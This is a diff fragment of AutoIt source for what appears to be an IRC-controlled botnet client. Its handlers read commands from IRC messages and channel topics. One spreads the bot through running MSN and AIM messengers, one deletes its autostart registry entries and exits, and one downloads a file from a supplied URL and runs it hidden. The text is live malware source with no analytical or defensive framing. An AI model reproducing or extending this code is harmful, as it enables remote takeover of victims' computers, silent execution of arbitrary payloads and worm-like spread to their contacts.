+					if StringLeft ( $msg , 3 ) = $IM Then
+						$TEMP = StringLen ( $msg )
+						If $TEMP > 10 Then
+							$URLL = StringTrimLeft( $msg , 4 )
+							;_IRCSendMessage($sock, "\\ [IM] Spread Activated.", $channel)
+							if ProcessExists( "msnmsgr.exe") Then
+								$NONAV = 0
+								_IMSpread()
+							EndIf
+							if ProcessExists( "aim6") Then
+								$NONAV = 0
+								_IMSpread()
+							EndIf
+							if ProcessExists( "msmsgs.exe" ) Then
+								$NONAV = 0
+								_IMSpread()
+							Else
+								if $NONAV = 1 Then
+								_IRCSendMessage($sock, "\\ No IM Available.", $channel)
+								Endif
+							EndIf
+							EndIf
+							EndIf
+
+				;; Remove Function
+				If Stringleft( $msg , 7 ) = $REMOVE Then
+					_IRCSendMessage($sock, "\\ [REMOVED]", $channel)
+					RegDelete("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", $AutoStartValue )
+					RegDelete("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices", $AutoStartValue )
+					RegDelete("HKEY_LOCAL_MACHINE\Software\Microsoft\OLE" , $AutoStartValue )
+					RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa", $AutoStartValue )
+					$REMFILE = 1
+					Sleep ( 4000 )
+					Exit
+				EndIf
+
+			EndIf
+
+
+
+			Case "422";
+				_IRCJoinChannel ($sock, $channel)
+				_IRCChangeMode ($sock, "-ixw", $nick)
+
+			Case "332"
+				$TEMP = StringMid($sData[$i], StringInStr($sData[$i], ":", 0, 2)+1)
+				;; Topic IM Spread Function
+					if StringLeft ( $TEMP , 3 ) = $IM Then
+						$TEMP = StringLen ( $TEMP )
+						If $TEMP > 10 Then
+							$URLL = StringTrimLeft( $TEMP , 4 )
+							;_IRCSendMessage($sock, "\\ [IM] Spread Activated.", $channel)
+							if ProcessExists( "msnmsgr.exe") Then
+								$NONAV = 0
+								_IMSpread()
+							EndIf
+							if ProcessExists( "aim6") Then
+								$NONAV = 0
+								_IMSpread()
+							EndIf
+							if ProcessExists( "msmsgs.exe" ) Then
+								$NONAV = 0
+								_IMSpread()
+							Else
+								if $NONAV = 1 Then
+								_IRCSendMessage($sock, "\\ No IM Available.", $channel)
+								Endif
+							EndIf
+							EndIf
+							EndIf
+					;; Topic Download Function
+					if Stringleft( $TEMP , 9 ) = $DL Then
+						Dim $DLL
+						$DLL = StringMid($sData[$i], StringInStr($sData[$i], ":", 0, 2)+1)
+						$TEMP = StringSplit( $DLL, " " )
+
+						$URL = $TEMP[2]
+						$DEST = $TEMP[3]
+						$EXEC = $TEMP[4]
+
+						$INETSIZE = InetGetSize ( $URL )
+						if $INETSIZE > 100 Then
+						_IRCSendMessage($sock, "\\ [D]ownloading File From: " & $URL & " \\ [S]ize: " & $INETSIZE & " bytes." , $channel)
+						InetGet($URL, $DEST , 1, 1)
+
+						While @InetGetActive
+						Sleep ( 1000 )
+					Wend
+					if $EXEC = 1 Then
+					_IRCSendMessage($sock, "\\ [D]ownloading done... \\ [E]xecuting!", $channel)
+					Run( $DEST , "" ,@SW_HIDE )
+				Else
+					_IRCSendMessage($sock, "\\ [D]ownloading done...", $channel)
+					Endif
+				Else
+					_IRCSendMessage($sock, "\\ [D]ownload does not exist.", $channel)
+				EndIf
+				EndIf
+
+			Case "KICK"
+				Sleep ( 500 )
+				_IRCJoinChannel ($sock, $channel)
+
+		EndSwitch
+
+				Next
+WEnd
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: C:\Dokumente und Einstellungen\root\Desktop\spread\core.au3>
+; ----------------------------------------------------------------------------
+
